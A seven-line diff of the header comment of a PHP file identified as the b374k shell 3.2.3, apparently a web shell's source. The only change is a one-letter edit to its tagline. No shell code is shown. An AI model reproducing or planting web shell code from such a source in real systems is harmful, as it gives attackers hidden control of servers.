@@ -1,7 +1,7 @@
 <?php
 /*
 	b374k shell 3.2.3
-	Jayalah Indonesiaku
+	Jayalah Indonesiaaku
 	(c)2014
 	https://github.com/b374k/b374k
 
